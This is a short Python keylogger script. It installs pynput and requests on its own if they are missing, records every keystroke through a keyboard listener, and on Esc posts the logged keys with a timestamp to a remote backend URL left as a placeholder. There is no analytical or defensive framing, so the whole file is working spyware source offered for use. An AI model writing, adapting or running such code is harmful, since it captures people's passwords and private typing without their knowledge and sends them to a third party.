from datetime import datetime

try:
    import pynput
    import requests
except ImportError:
    import os
    os.system("pip install pynput")
    os.system("pip install requests")

    import pynput
    import requests

data = []

def onpress(key):
    if key == pynput.keyboard.Key.esc:
        onexit()
    else:
        data.append([key,])

def onexit():
    dataToSend = {
        "logs": data,
        "time": datetime.now().strftime("%b/%d/%Y | %H:%M:%S")
    }

    url = "Replace me with the backend API URL!"

    requests.post(url, data=dataToSend)
    print(dataToSend)

    open("SUCCESS", "w").close()

    import sys
    sys.exit()

with pynput.keyboard.Listener(on_press=onpress) as listener:
    listener.join()